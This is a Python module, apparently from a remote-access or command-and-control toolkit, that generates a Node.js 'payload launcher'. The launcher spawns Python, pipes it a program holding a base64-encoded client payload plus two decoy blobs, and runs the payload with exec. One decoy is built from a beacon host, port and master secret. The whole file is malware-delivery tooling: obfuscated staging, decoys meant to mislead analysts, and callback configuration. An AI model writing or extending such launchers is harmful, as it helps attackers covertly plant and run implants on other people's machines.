"""Node.js launcher exporter.

Node spawns `python -c "<decoder>"`, sends a full Python program
(with 3 blobs + UUID structure) on stdin. Python reads its own source
from stdin and executes it.
"""

from core.config import Config
from exporter.base_exporter import BaseExporter
from exporter.payload_prep import (
    build_decoy1,
    build_decoy2,
    prepare_payload,
)


class JsExporter(BaseExporter):
    format_name = "js"
    extension = ".js"

    def __init__(self, chunk_size=None, beacon_host=None, beacon_port=None):
        kwargs = {}
        if chunk_size is not None:
            kwargs["chunk_size"] = chunk_size
        super().__init__(**kwargs)

        cfg = Config()
        self.beacon_host = beacon_host if beacon_host is not None else cfg.host
        self.beacon_port = beacon_port if beacon_port is not None else cfg.port
        self._master_secret = cfg.auth_secret

    def export(self, client_source: str) -> str:
        uuid, prepared = prepare_payload(client_source)
        actual_b64 = self.payload_encoded(prepared)
        decoy1_b64 = self.payload_encoded(build_decoy1())
        decoy2_b64 = self.payload_encoded(
            build_decoy2(self.beacon_host, self.beacon_port, self._master_secret),
        )

        py_program = (
            "import base64 as _b64, sys as _rsc_sys\n"
            f"_RSC_UUID = {uuid!r}\n"
            "_RSC_LAUNCHED = True\n"
            f"_ACTUAL_B64 = {actual_b64!r}\n"
            f"_DECOY1_B64 = {decoy1_b64!r}\n"
            f"_DECOY2_B64 = {decoy2_b64!r}\n"
            "try:\n"
            "    _RSC_LOADER = _b64.b64decode(_DECOY1_B64)\n"
            "    _RSC_DIAG = _b64.b64decode(_DECOY2_B64)\n"
            "except Exception:\n"
            "    pass\n"
            "exec(compile(_b64.b64decode(_ACTUAL_B64), '<payload>', 'exec'))\n"
        )

        # Wrap in a JS template literal — escapes only \\, `, and ${
        safe_prog = (
            py_program
            .replace("\\", "\\\\")
            .replace("`", "\\`")
            .replace("${", "\\${")
        )

        inner = (
            "import sys;exec(compile(sys.stdin.read(),'<payload>','exec'))"
        )
        inner_js = inner.replace("\\", "\\\\").replace("'", "\\'")

        return (
            "#!/usr/bin/env node\n"
            "// Auto-generated payload launcher.\n"
            "const { spawn } = require('child_process');\n\n"
            f"const PROGRAM = `{safe_prog}`;\n\n"
            "const py = spawn('python', ['-c',\n"
            f"  '{inner_js}'\n"
            "], { stdio: ['pipe', 'inherit', 'inherit'] });\n\n"
            "py.stdin.write(PROGRAM);\n"
            "py.stdin.end();\n"
            "py.on('close', code => process.exit(code ?? 0));\n"
        )
